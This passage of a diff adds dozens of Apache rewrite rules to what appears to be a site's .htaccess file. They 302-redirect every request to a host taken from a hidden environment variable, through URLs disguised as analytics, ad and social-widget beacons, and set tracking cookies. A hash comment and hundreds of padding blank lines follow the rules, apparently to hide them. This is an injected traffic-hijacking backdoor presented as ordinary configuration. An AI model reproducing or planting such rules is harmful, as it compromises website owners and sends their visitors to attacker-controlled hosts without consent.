+RewriteRule ^.* http://%{ENV:cDs}/api/getCount2.php?cb=stButtons.processCB&refDomain=www.mangahere.com&refQuery=manga/metallic_colors/c001/7.html&pgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pubKey=e47efe7d-147b-4731-ac42-9838ccdc52f2&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9582:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 30
+RewriteRule ^.* http://%{ENV:cDs}/s?bc=70889575&plid=AATD1OSHaOwoFJtC&h=641&sd=B4A7D60A5MH1341219068457540&volume=100&len=2970.72&fmt=5&nsiabblmean=16367.560&md=1&csipt=watch5ad&docid=lRZwI9LQIM8&nsivbblmean=126195.841&hl=en_US&nsivbblmin=64215.000&bd=2162688&bt=40.502&tpmt=1280&cfps=25.29510961214165&nsiabblmin=16168.000&screenw=1024&referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&screenh=768&fexp=919104,901601,921602,924700,913542,907335,922600,919306,919324,907344,907217,920706,919316,910006,920704,924500,912706,902518&playerw=854&vtmp=1&playerh=640&ptk=youtube_none&scoville=1&w=854&mos=0&sendtmp=1&fs=1&nsivbblmax=244511.000&rt=1402.670&sdetail=f:related\%2Crv:KQu39OO60As&vid=XnLoXTXgEZEZMARZ1_8tsJTlf6TKCAOPC&lact=658210&et=1256.306&vq=small&st=1215.906&nsiabblmax=16379.000&nsivbblc=252&decoding=software&ahoffset=30&vw=320&nsiabblc=252&rendering=software&vh=240&sourceid=yw&feature=related&cr=ID&ns=yt&hbt=119.496&el=detailpage&hbd=4326253  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9600:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 31
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=5.3.2&utms=1&utmn=1238075384&utmhn=oto.detik.com&utmcs=ISO-8859-1&utmsr=1024x768&utmvp=1007x628&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r42&utmdt=detikoto&utmhid=2029316558&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/\%3F883304638&utmac=UA-891770-22&utmcc=__utma\%3D1.60131793.1334705912.1340600713.1340671021.86\%3B\%2B__utmz\%3D1.1340671021.86.84.utmcsr\%3Ddetik.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/\%3B&utmu=qhAAAAAg~  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11537:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 32
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=5.3.3&utms=10&utmn=143988629&utmhn=sebar.idblognetwork.com&utmcs=ISO-8859-1&utmsr=1024x768&utmvp=130x610&utmsc=24-bit&utmul=en-us&utmje=1&utmfl=11.1\%20r102&utmhid=1820322914&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/psg_ppc.php\%3Fb\%3D3772\%26sz\%3D120x600&utmac=UA-17908524-1&utmcc=__utma\%3D72858257.173469411.1342155452.1342155452.1342155452.1\%3B\%2B__utmz\%3D72858257.1342155452.1.1.utmcsr\%3Dsepung.blogdetik.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/2012/07/09/jember-fashion-carnaval-2012-ditonton-jutaan-pasang-mata/\%3B&utmu=q~  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10904:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 33
+RewriteRule ^.* http://%{ENV:cDs}/t.gif?_=1340068779118&count=horizontal&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&size=m&text=\%20Hadang\%20Android\%2C\%20Nokia\%20Siapkan\%20Lumia\%20Murah&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=kompascom&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1334627957284262969318907  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10149:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 34
+RewriteRule ^.* http://%{ENV:cDs}/ping?h=en.uefa.com&p=/under21/season\%3D2013/teams/index.html&u=ennu439bum2jenjj&d=uefa.com&g=342&n=0&f=14&c=0&x=0&y=2454&w=581&j=45&R=1&W=0&I=0&E=0&v=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&t=jbeitnmycshwkusn&V=6&D=hdqz07s6knlhw3a6&i=Under-21\%20-\%20Teams\%20\%E2\%80\%93\%20UEFA.com&_  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11598:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 35
+RewriteRule ^.* http://%{ENV:cDs}/b?c1=2&c2=7198000&c3=&c4=www.tagged.com/profile.html&c5=&c6=&c15=e9a0fc1888cca79f66987ec4c639cf04bdc1de55&ns__t=1341893903160&ns_c=UTF-8&c8=Tagged\%20-\%20Aizh\%20DeaLova\%E2\%80\%99s\%20Profile&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10242:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 36
+RewriteRule ^.* http://%{ENV:cDs}/imghover?iact=hm&ei=K0r6T8C1DMjJrAfcwJ3cBg&q=masakan+manado+babi&tbs=&page=3&tbnh=127&tbnw=174&start=44&ndsp=27&dur=506&tbnid=qBSfgTUjZshlfM:&hovh=134&hovw=179&vpx=318&vpy=361&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:8,s:44,i:236&vetl=ms  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11830:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 37
+RewriteRule ^.* http://%{ENV:cDs}/img2.jsp?rser=mtmWnZm1mtu2ncmJmtm3nJyJiZCWnsmJmZm0ncmJmJmJi3nVzMLZDgLJywrVCYmJDhj1zsmJmc4W&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&l=  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10173:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 38
+RewriteRule ^.* http://%{ENV:cDs}/statapi/stat/add?jsoncallback=jsonp1340875281932&app_id=4fd761140c62703013000228&article_id=840924&title=Liputan\%2520Khusus\%2520Piala\%2520Eropa\%25202012\%2520-Adu\%2520Kekuatan\%2520Mental\%2520Tim\%2520Spesialis\%2520Turnamen&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ip=202.95.141.230&browser=Mozilla&version=5.0+(Windows)&platform=Windows+NT+5.1&user_agent=Mozilla/5.0+(Windows+NT+5.1\%3B+rv:8.0.1)+Gecko/20100101+Firefox/8.0.1  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9245:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 39
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=5.3.3&utms=1&utmn=1246810187&utmhn=www.dafa2012.com&utmcs=UTF-8&utmsr=1024x768&utmvp=1007x612&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=-&utmdt=Dafa2012\%20-\%20Euro2012&utmhid=1918120612&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/\%3Flang\%3Den\%26trackingId\%3DTRK62350973\%26mediaId\%3DMED572242423\%26language\%3Den-US&utmac=UA-31013714-1&utmcc=__utma\%3D169007412.325404333.1340959349.1340959349.1340959349.1\%3B\%2B__utmz\%3D169007412.1340959349.1.1.utmcsr\%3Dads.wsbig2.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/www/delivery/afr.php\%3B&utmu=q~  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9985:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 40
+RewriteRule ^.* http://%{ENV:cDs}/imghover?iact=hm&ei=h9n7T43-KcXZrQeQ1oy_Bg&q=rangkaian+elektro+ampli&tbs=&page=1&tbnh=93&tbnw=163&start=0&ndsp=15&dur=3512&tbnid=jdNHu_z6yMb_VM:&hovh=169&hovw=298&vpx=426&vpy=155&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:2,s:0,i:75&vetl=ms  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10186:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 41
+RewriteRule ^.* http://%{ENV:cDs}/piwik/piwik.php?action_name=Sensus\%20Penduduk\%202010\%20-\%20Penduduk\%20Menurut\%20Kelompok\%20Umur\%20dan\%20Agama\%20yang\%20Dianut\%20\%7C\%20Provinsi\%20Aceh&idsite=1&rec=1&r=159003&h=14&m=48&s=5&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&urlref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&_id=1fabea57a0c31b45&_idts=1340176540&_idvc=1&_idn=0&_refts=1340176540&_viewts=1340176540&_ref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pdf=1&qt=1&realp=1&wma=1&dir=0&fla=1&java=0&gears=0&ag=1&res=1024x768&cookie=1  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11285:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 42
+RewriteRule ^.* http://%{ENV:cDs}/pixel;r=1818452661;a=p-18-mFEk4J448M;labels=\%2Clanguage.en\%2Ctype.wpcom;fpan=0;fpa=P0-1786211281-1340597665809;ns=1;ce=1;je=0;sr=1024x768x24;enc=n;dst=0;et=1340597680638;tzo=-420;ref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9774:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 43
+RewriteRule ^.* http://%{ENV:cDs}/b?c1=8&c2=6036211&rn=0.8766197710112102&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c3=&c4=&c5=&c6=&c10=&c15=&c16=&c8=&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cv=1.8  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10001:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 44
+RewriteRule ^.* http://%{ENV:cDs}/pagead/ads?ad_block=2&client=ca-pub-6219811747049371&format=300x250_as&output=html&h=250&w=300&channel=7719458962\%2B7993652408\%2B7719458961\%2B0854550287\%2Bafv_user_rocketnews24\%2Bafv_user_id_pDthKGt2g9haI6x2_8eJbw\%2Byt_mpvid_AATE67nvxO2ytRII\%2Byt_cid_285422\%2Bivpypp\%2Bytexp_903114.915101.906510.907217.907335.921602.919306.922600.919316.919804.920704.924500.906831.924700.913542.919324.920706.924402.907344.912706.902518\%2BVertical_Banner_71\%2BVertical_Banner_276\%2BVertical_Banner_918\%2BVertical_Banner_1562\%2BVidVert71\%2BVidVert276\%2BVidVert918\%2BVidVert1562\%2BVertical_71\%2BVertical_276\%2BVertical_918\%2BVertical_1562\%2Bytps_default\%2Bytel_detailpage\%2Bafc_on_page&host=ca-host-pub-5134839803636839&ht_id=291356&ad_type=image&alternate_ad_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&color_bg=FFFFFF&color_border=FFFFFF&color_link=0033CC&color_text=444444&color_url=0033CC&cust_age=1001&cust_gender=2&flash=11.1.102&hl=en&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&video_doc_id=yt_Sdyxd0LsL1I&dt=1342416787019&shv=r20100101&jsv=r20100101&correlator=1342416788958&frm=4&adk=923417582&ga_vid=1936475958.1306482248&ga_sid=1342416789&ga_hid=757046773&ga_fc=1&u_tz=420&u_his=2&u_java=0&u_h=720&u_w=1280&u_ah=690&u_aw=1280&u_cd=24&u_nplug=12&u_nmime=33&biw=1263&bih=581&ref=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&fu=0&js=uds&eid=37464000  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9242:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 45
+RewriteRule ^.* http://%{ENV:cDs}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-9141&sessionID=1341558386325.86981&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/yuru_koi/v01/c003/33.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.xlHqosvX&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/yuru_koi/v01/c003/32.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Yuru\%20Koi\%203\%20-\%20Read\%20Yuru\%20Koi\%20Chapter\%203\%20Online\%20-\%20Page\%2033&ts1341558386327.0=  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10865:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 46
+RewriteRule ^.* http://%{ENV:cDs}/f.gif?_=1340683032924&id=twitter-widget-0&lang=en&screen_name=detiksport&show_count=true&show_screen_name=true&size=m&twttr_variant=2.0&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=0&twttr_li=0&twttr_pid=v3:1340675878687145152256625  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10600:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 47
+RewriteRule ^.* http://%{ENV:cDs}/imghover?iact=hm&ei=LJr7T6qFI8fXrQfLsNy-Bg&q=2+ne+1+i+love+you&tbs=&page=1&tbnh=139&tbnw=214&start=0&ndsp=10&dur=1369&tbnid=5mSMLCgR08SQnM:&hovh=189&hovw=266&vpx=542&vpy=40&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:2,s:0,i:76&vetl=ms  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10443:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 48
+RewriteRule ^.* http://%{ENV:cDs}/s?at=2_3&len=307&nsivbblmin=1724.000&ptk=rocketnews24\%2Buser&sidx=0&iframe=1&vid=tyyZmhZQhpi1re4lfPAwnGOgRj3x4qRnC&ahoffset=27&vw=640&art=2&rendering=software&vh=360&mos=0&decoding=software&st=36.87,45.545,55.655&nsivbblmean=132742.342&plid=AATE65noBL5d8h_I&et=43.777,49.549,62.996&tsphab=1&nsidf=54&w=560&ns=yt&vq=auto&tspfdt=563&bc=7921467&hbd=4286796&ad_flags=0&sendtmp=1&hbt=105.398&nsiabblc=272&hl=en_US&eurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&docid=Sdyxd0LsL1I&fmt=34&sd=B6F5FF005HH1342416086201530&cid=285422&nsivbblc=272&el=embedded&fexp=920704,912706,921602,919804,913542,907335,922600,903114,924700,906510,906831,907344,907217,919306,920706,919316,902518,919324,924402,924500,915101&nsivbblmax=254040.000&tspne=0&ad_event=3&bd=3453289&rt=116.196&nsiabblmax=94064.000&bt=41.083&allowed=2_1,2_3&nsiabblmean=46279.680&md=1&framer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&tpmt=62&volume=100&vtmp=1&cfps=6.696428571428571&nbe=2&screenw=1280&mt=0&h=315&playerw=560&sst=0&playerh=315&screenh=720&scoville=1&pd=13.814&ex_ads=3=1_1,1_2,1_3,2_2,2_2_1&slots=sst~0;sidx~0;at~2_3&fs=0&nsiabblmin=2979.000  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10995:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 49
+RewriteRule ^.* http://%{ENV:cDs}/url?sa=t&rct=j&q=Utricularia+purpurea&source=web&cd=1&ved=0CFMQFjAA&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ei=qSrgT6z6PIfprQe7yOWFDQ&usg=AFQjCNHumkj61iVcfbokhfb353ieOhGlAg  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10516:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 50
+RewriteRule ^.* http://%{ENV:cDs}/cgi-bin/m?rnd=1264752618206&ci=es-20minutos&cg=deportes&cc=1&sr=1280x800&cd=24&lg=es-ES&je=n&ck=y&tz=1&fl=10&si=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&rp=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10439:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 51
+RewriteRule ^.* http://%{ENV:cDs}/www/delivery/lg.php?bannerid=49&campaignid=33&zoneid=14&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=7a8d1a741a  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9572:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 52
+RewriteRule ^.* http://%{ENV:cDs}/b?c1=7&c2=8097938&rn=2057026963&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c3=8097938&c8=ShareThis\%20Segmenter&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cv=2.2&cs=js  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10616:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 53
+RewriteRule ^.* http://%{ENV:cDs}/url?sa=t&rct=j&q=tidak+tahu+terima+kasih+in+english&source=web&cd=1&ved=0CFEQFjAA&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ei=XpADUM6rC82HrAews6yiBg&usg=AFQjCNHlO91kgpt7eC8QzRtBtKCDJL2TSw&cad=rja  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11455:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 54
+RewriteRule ^.* http://%{ENV:cDs}/b?c1=7&c2=14320224&c3=000&ns__t=1341883467461&ns_c=UTF-8&c8=&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9197:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 55
+RewriteRule ^.* http://%{ENV:cDs}/imghover?iact=hm&ei=6QH8T-T0DZDkrAef2LDBBg&q=feelingquotes&tbs=&page=3&tbnh=103&tbnw=173&start=37&ndsp=24&dur=1471&tbnid=GaHIG31AZPHJCM:&hovh=173&hovw=292&vpx=441&vpy=292&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:2,s:37,i:197&vetl=ms  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10813:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 56
+RewriteRule ^.* http://%{ENV:cDs}/b/ss/wmg,wmgatl,wmgd2cparamore,wmgparamoreall/1/H.20.3/s56989104803651?AQB=1&ndh=1&t=25/0/2010\%2011:54:55\%201\%20-60&vmt=4B7EBDA2&pageName=Paramore:Photos&g=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&r=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cc=USD&ch=Paramore:Photos&server=Paramore&events=event11&c1=Paramore&h1=Paramore\%7CPhotos&c2=Atlantic&v4=Paramore&c6=Atlantic:Fueled\%20By\%20Ramen&c9=5:30AM&c10=Monday&c11=Weekday&s=1440x900&c=24&j=1.6&v=Y&k=Y&bw=1440&bh=741&p=Shockwave\%20Flash\%3BDivX\%AE\%20Web\%20Player\%3BQuickTime\%20Plug-in\%207.2.0\%3BVLC\%20Multimedia\%20Plugin\%20\%28compatible\%20Totem\%202.26.1\%29\%3BWindows\%20Media\%20Player\%20Plug-in\%2010\%20\%28compatible\%3B\%20Totem\%29\%3B&pid=Paramore:Photos&pidt=1&oid=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ot=A&AQE=1  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11785:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 57
+RewriteRule ^.* http://%{ENV:cDs}/www/delivery/ajs.php?zoneid=185&cb=79947667779&charset=UTF-8&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&mmm_fo=1  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:11893:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 58
+RewriteRule ^.* http://%{ENV:cDs}/__utm.gif?utmwv=5.3.3&utms=7&utmn=297220299&utmhn=pilkada.kompas.com&utmcs=utf-8&utmsr=1024x768&utmvp=974x657&utmsc=32-bit&utmul=en&utmje=1&utmfl=11.3\%20r300&utmdt=Sekjen\%20PDI-P\%20Tjahjo\%20Kumolo\%20Juga\%20Tak\%20Terdaftar\%20di\%20DPT\%20-\%20LIPSUS\%20Jakarta1&utmhid=5443267&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/berita/read/2012/07/11/19552532/Sekjen.PDIP.Tjahjo.Kumolo.Juga.Tak.Terdaftar.di.DPT&utmac=UA-3374285-1&utmcc=__utma\%3D83180439.414711367.1340010373.1340335693.1342053930.3\%3B\%2B__utmz\%3D83180439.1342053930.3.3.utmcsr\%3Dkompas.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/\%3B&utmu=q~  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:9641:/:0:HttpOnly]
+RewriteCond %{ENV:zCT} 59
+RewriteRule ^.* http://%{ENV:cDs}/imghover?iact=hm&ei=y_zjT_OMBsnLrQeEs-TvCA&q=graphic+design+student&tbs=&page=5&tbnh=143&tbnw=188&start=98&ndsp=27&dur=10507&tbnid=wUb3rwFdGmAs1M:&hovh=183&hovw=275&vpx=380&vpy=321&imgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&imgrefurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ved=1t:1527,r:14,s:98,i:51&vetl=ms  [R=302,NE,L,CO=zCT:%{ENV:zCT}:%{HTTP_HOST}:10422:/:0:HttpOnly]
+
+</IfModule>
+#068bf13e4ed61bfaa0d59c278582eef2bcbcbae80af729a1d0f8f696
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
